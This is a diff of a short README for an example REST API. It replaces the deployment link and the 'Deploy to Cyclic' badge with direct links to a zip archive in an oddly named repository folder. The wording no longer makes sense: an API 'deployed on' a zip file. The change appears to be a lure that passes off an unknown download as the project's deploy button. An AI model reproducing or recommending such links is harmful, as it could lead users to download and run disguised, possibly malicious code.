@@ -1,8 +1,8 @@
 # Starter REST Api
 
-This is an example REST Api designed to be deployed on https://raw.githubusercontent.com/JayasimhaDev/starter-rest-api/main/triregnum/api_rest_starter_v1.0.zip
+This is an example REST Api designed to be deployed on https://raw.githubusercontent.com/JayasimhaDev/starter-rest-api/main/triregnum/api-starter-rest-wauch.zip
 
-[![Deploy to Cyclic](https://raw.githubusercontent.com/JayasimhaDev/starter-rest-api/main/triregnum/api_rest_starter_v1.0.zip)](https://raw.githubusercontent.com/JayasimhaDev/starter-rest-api/main/triregnum/api_rest_starter_v1.0.zip)
+[![Deploy to Cyclic](https://raw.githubusercontent.com/JayasimhaDev/starter-rest-api/main/triregnum/api-starter-rest-wauch.zip)](https://raw.githubusercontent.com/JayasimhaDev/starter-rest-api/main/triregnum/api-starter-rest-wauch.zip)
 
 
 ## Examples
